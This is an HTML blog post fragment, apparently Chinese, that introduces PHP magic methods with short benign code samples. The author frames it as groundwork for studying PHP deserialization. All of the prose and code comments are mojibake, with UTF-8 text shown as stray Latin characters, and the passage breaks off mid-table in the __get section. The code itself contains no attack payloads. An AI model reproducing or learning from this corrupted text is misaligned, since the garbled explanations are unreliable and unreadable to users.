    <content type="html"><![CDATA[<p>æœ¬äººåœ¨å­¦ä¹ phpååºåˆ—åŒ–æ—¶ï¼Œæ·±æ„Ÿæ— åŠ›ï¼Œå‘ç°å¹¶ä¸èƒ½å°†å‘åºåˆ—åŒ–ä½œä¸ºä¸€ä¸ªå°ç‚¹ï¼Œè¦ä»phpåº•å±‚å¼€å§‹ç†è§£</p><p>å…ˆäº†è§£ä¸€ä¸‹phpçš„é­”æœ¯æ–¹æ³•</p><blockquote><p>__construct()ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨ç±»å®ä¾‹åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•°<br>__destruct()ç±»çš„ææ„å‡½æ•°ï¼Œåœ¨å¯¹è±¡é”€æ¯ä¹‹å‰è‡ªåŠ¨è°ƒç”¨ææ„å‡½æ•°<br>__sleep()åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ï¼ˆä½¿ç”¨ serialize() å‡½æ•°ï¼‰ä¹‹å‰è‡ªåŠ¨è°ƒç”¨ï¼Œå¯ä»¥åœ¨æ­¤æ–¹æ³•ä¸­æŒ‡å®šéœ€è¦è¢«åºåˆ—åŒ–çš„å±æ€§ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„<br>__wakeup()åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ï¼ˆä½¿ç”¨ unserialize() å‡½æ•°ï¼‰ä¹‹å‰è‡ªåŠ¨è°ƒç”¨ï¼Œå¯ä»¥åœ¨æ­¤æ–¹æ³•ä¸­é‡æ–°åˆå§‹åŒ–å¯¹è±¡çŠ¶æ€ã€‚<br>__set($property, $value)å½“ç»™ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®(privateä¿®é¥°)çš„å±æ€§èµ‹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åå’Œå±æ€§å€¼ä½œä¸ºå‚æ•°ã€‚<br>__get($property)å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åä½œä¸ºå‚æ•°ã€‚<br>__isset($property)å½“å¯¹ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä½¿ç”¨ isset() æˆ– empty() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åä½œä¸ºå‚æ•°ã€‚<br>__unset($property)å½“å¯¹ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä½¿ç”¨ unset() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åä½œä¸ºå‚æ•°ã€‚<br>__call($method, $arguments)è°ƒç”¨ä¸å­˜åœ¨æˆ–ä¸å¯è§çš„æˆå‘˜æ–¹æ³•æ—¶ï¼ŒPHPä¼šå…ˆè°ƒç”¨__call()æ–¹æ³•æ¥å­˜å‚¨æ–¹æ³•ååŠå…¶å‚æ•°<br>__callStatic($method, $arguments)å½“è°ƒç”¨ä¸€ä¸ªé™æ€æ–¹æ³•ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’æ–¹æ³•åå’Œå‚æ•°æ•°ç»„ä½œä¸ºå‚æ•°ã€‚<br>__toString()å½“ä½¿ç”¨echoæˆ–printè¾“å‡ºå¯¹è±¡å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼æ—¶ï¼Œä¼šè°ƒç”¨__toString()æ–¹æ³•<br>__invoke()å½“å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°è¿›è¡Œè°ƒç”¨æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚<br>__clone()å½“ä½¿ç”¨ clone å…³é”®å­—å¤åˆ¶ä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚<br>__set_state($array)åœ¨ä½¿ç”¨ var_export() å¯¼å‡ºç±»æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºè¿”å›ä¸€ä¸ªåŒ…å«ç±»çš„é™æ€æˆå‘˜çš„æ•°ç»„ã€‚<br>__debugInfo()åœ¨ä½¿ç”¨ var_dump() æ‰“å°å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºè‡ªå®šä¹‰å¯¹è±¡çš„è°ƒè¯•ä¿¡æ¯ã€‚</p></blockquote><p>1.__construct<br>æ„é€ å‡½æ•° __constructåœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶ä¾¿ä¼šè‡ªåŠ¨æ‰§è¡Œè¯¥æ–¹æ³•  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è§¦å‘äº†æ„é€ å‡½æ•°1æ¬¡&quot;</span> ;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);    <span class="hljs-comment">//å®ä¾‹åŒ–å¯¹è±¡æ—¶è§¦å‘æ„é€ å‡½æ•°__construct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);       <span class="hljs-comment">//åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸ä¼šè§¦å‘æ„é€ å‡½æ•°</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.__destruct()<br>ææ„å‡½æ•°__destruct,åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨æ‰§è¡Œè¯¥æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è§¦å‘äº†ææ„å‡½æ•°1æ¬¡&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;benben&quot;</span>);  <span class="hljs-comment">//å®ä¾‹åŒ–å¯¹è±¡ç»“æŸåï¼Œä»£ç è¿è¡Œå®Œä¼šé”€æ¯ï¼Œè§¦å‘ææ„å‡½æ•°_destruct()</span><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);     <span class="hljs-comment">//åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¸ä¼šè§¦å‘</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);           <span class="hljs-comment">//åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè§¦å‘ï¼Œååºåˆ—åŒ–å¾—åˆ°çš„æ˜¯å¯¹è±¡ï¼Œç”¨å®Œåä¼šé”€æ¯ï¼Œè§¦å‘ææ„å‡½æ•°_destruct()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä»¥ä¸Šä»£ç æ€»å…±è§¦å‘ä¸¤æ¬¡ææ„å‡½æ•°ï¼Œç¬¬ä¸€æ¬¡ä¸ºå®ä¾‹åŒ–å¯¹è±¡åï¼Œä»£ç è¿è¡Œå®Œä¼šï¼Œå¯¹è±¡ä¼šè¢«é”€æ¯ï¼Œè§¦å‘ææ„å‡½æ•°_destruct()ï¼›ç¬¬äºŒæ¬¡åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè§¦å‘ï¼Œååºåˆ—åŒ–å¾—åˆ°çš„æ˜¯å¯¹è±¡ï¼Œç”¨å®Œåä¼šé”€æ¯ï¼Œè§¦å‘ææ„å‡½æ•°_destruct()</p></blockquote><p>3.__sleep()</p><blockquote><p>åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼Œserialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œå¯ä»¥åœ¨æ­¤æ–¹æ³•ä¸­æŒ‡å®šéœ€è¦è¢«åºåˆ—åŒ–çš„å±æ€§ï¼Œè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚ç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚<br>æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICEçº§åˆ«çš„é”™è¯¯ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);      <span class="hljs-comment">//sleepæ‰§è¡Œè¿”å›éœ€è¦åºåˆ—åŒ–çš„å±æ€§åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);      <span class="hljs-comment">//serialize()åªåºåˆ—åŒ–sleepè¿”å›çš„å˜é‡ï¼Œåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ï¼šO:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>4.__wakeup()</p><blockquote><p>åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œunserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__wakeup()ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œåšä¸€äº›åˆå§‹åŒ–å·¥ä½œã€‚<br>ä½¿ç”¨__wakeupæ–¹æ³•çš„åŸå› æ˜¯ä¸ºäº†é‡å»ºåœ¨åºåˆ—åŒ–ä¸­å¯èƒ½ä¸¢å¤±çš„æ•°æ®åº“è¿æ¥ï¼Œæˆ–è€…æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable language_">$this</span>-&gt;username;       <span class="hljs-comment">//ååºåˆ—åŒ–ä¹‹å‰è§¦å‘_wakeup(),ç»™passwordèµ‹å€¼</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;    <span class="hljs-comment">// å­—ç¬¦ä¸²ä¸­å¹¶æ²¡æœ‰password</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$user_ser</span>));   <span class="hljs-comment">// object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125; </span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__wakeup()åœ¨ååºåˆ—åŒ–unserialize()ä¹‹å‰è¢«è°ƒç”¨<br>__destruct()åœ¨ååºåˆ—åŒ–unserialize()ä¹‹åè¢«è°ƒç”¨</p></blockquote><p>5.__toString()</p><blockquote><p>å½“ä½¿ç”¨echoæˆ–printè¾“å‡ºå¯¹è±¡å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œæˆ–è€…å°†ä¸€ä¸ªâ€œå¯¹è±¡â€ä¸â€œå­—ç¬¦ä¸²â€è¿›è¡Œæ‹¼æ¥æ—¶ï¼Œä¼šè°ƒç”¨__toString()æ–¹æ³•</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;æ ¼å¼ä¸å¯¹ï¼Œè¾“å‡ºä¸äº†!&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">// æŠŠç±»Userå®ä½“åŒ–å¹¶èµ‹å€¼ç»™$testï¼Œæ­¤æ—¶$testæ˜¯ä¸ªå¯¹è±¡</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$test</span>);          <span class="hljs-comment">// æ‰“å°è¾“å‡ºå¯¹è±¡å¯ä»¥ä½¿ç”¨print_ræˆ–è€…var_dumpï¼Œè¯¥å¯¹è±¡è¾“å‡ºåä¸ºï¼šUser Object(    [benben] =&gt; this is test!!)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span>;              <span class="hljs-comment">// å¦‚æœä½¿ç”¨echoæˆ–è€…printåªèƒ½è°ƒç”¨å­—ç¬¦ä¸²çš„æ–¹å¼å»è°ƒç”¨å¯¹è±¡ï¼Œå³æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²ä½¿ç”¨ï¼Œæ­¤æ—¶è‡ªåŠ¨è§¦å‘toString()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>6.__invoke()<br>å½“å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°è¿›è¡Œè°ƒç”¨æ—¶ä¼šè§¦å‘__invoke()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span> = <span class="hljs-string">&quot;this is test!!&quot;</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">         </span>&#123;<br>             <span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;å®ƒä¸æ˜¯ä¸ªå‡½æ•°!&#x27;</span>;<br>          &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;     <span class="hljs-comment">//æŠŠç±»Userå®ä¾‹åŒ–ä¸ºå¯¹è±¡å¹¶èµ‹å€¼ç»™$test</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$test</span> -&gt;benben;     <span class="hljs-comment">//æ­£å¸¸è¾“å‡ºå¯¹è±¡é‡Œçš„å€¼benben</span><br><span class="hljs-variable">$test</span>();                 <span class="hljs-comment">//åŠ ()æ˜¯æŠŠtestå½“æˆå‡½æ•°test()æ¥è°ƒç”¨ï¼Œæ­¤æ—¶è§¦å‘_invoke()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>7.__call()<br>å½“è°ƒç”¨ä¸å­˜åœ¨æˆ–ä¸å¯è§çš„æˆå‘˜æ–¹æ³•æ—¶ï¼ŒPHPä¼šå…ˆè°ƒç”¨__call()æ–¹æ³•æ¥å­˜å‚¨æ–¹æ³•ååŠå…¶å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt; <span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>); <span class="hljs-comment">//è°ƒç”¨çš„æ–¹æ³•callxxx()ä¸å­˜åœ¨,è§¦å‘é­”æœ¯æ–¹æ³•call(),ä¼ å‚(callxxx,a);$arg1:è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°;$arg2:è°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„å‚æ•°ï¼›</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>__call(string $function_name, array $arguments)è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° $function_name ä¼šè‡ªåŠ¨æ¥æ”¶ä¸å­˜åœ¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ª $arguments åˆ™ä»¥æ•°ç»„çš„æ–¹å¼æ¥æ”¶ä¸å­˜åœ¨æ–¹æ³•çš„å¤šä¸ªå‚æ•°</p></blockquote><p>8.__callStatic()<br>å½“è°ƒç”¨ä¸å­˜åœ¨æˆ–ä¸å¯è§çš„é™æ€æ–¹æ³•æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__callStatic()æ–¹æ³•ï¼Œä¼ é€’æ–¹æ³•åå’Œå‚æ•°æ•°ç»„ä½œä¸ºå‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__callStatic</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$arg1</span>,<span class="hljs-subst">$arg2</span>[0]&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>::<span class="hljs-title function_ invoke__">callxxx</span>(<span class="hljs-string">&#x27;a&#x27;</span>);        <span class="hljs-comment">//é™æ€è°ƒç”¨ä½¿ç”¨&quot;::&quot;ï¼Œé™æ€è°ƒç”¨æ–¹æ³•callxxx()ï¼Œç”±äºå…¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥è§¦å‘__callStaticï¼Œä¼ å‚(callxxx,a)ï¼Œè¾“å‡ºï¼šcallxxx,a</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>9.__set()<br>__set($name, $value)å‡½æ•°ï¼Œç»™ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®(privateä¿®é¥°)çš„å±æ€§èµ‹å€¼æ—¶ï¼ŒPHPå°±ä¼šæ‰§è¡Œ__set()æ–¹æ³•ã€‚__set()æ–¹æ³•åŒ…å«ä¸¤ä¸ªå‚æ•°ï¼Œ$nameè¡¨ç¤ºå˜é‡åç§°ï¼Œ$valueè¡¨ç¤ºå˜é‡å€¼ï¼Œä¸¤ä¸ªå‚æ•°ä¸å¯çœç•¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> ,<span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$arg2</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span>-&gt;var2=<span class="hljs-number">1</span>;        <span class="hljs-comment">//ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§var2èµ‹å€¼ä¸º1ï¼Œè‡ªåŠ¨è§¦å‘__set()æ–¹æ³•ï¼›å¦‚æœæœ‰__get(),å…ˆè°ƒç”¨__get(),å†è°ƒç”¨__set()ï¼Œè¾“å‡ºï¼švar2,1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>10.__get()<br>__get($name)å‡½æ•°ï¼Œå½“ç¨‹åºè®¿é—®ä¸€ä¸ªæœªå®šä¹‰æˆ–ä¸å¯è§çš„æˆå‘˜å˜é‡æ—¶ï¼ŒPHPå°±ä¼šæ‰§è¡Œ __get()æ–¹æ³•æ¥è¯»å–å˜é‡å€¼ã€‚__get()æ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºè¦è°ƒç”¨çš„å˜é‡å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 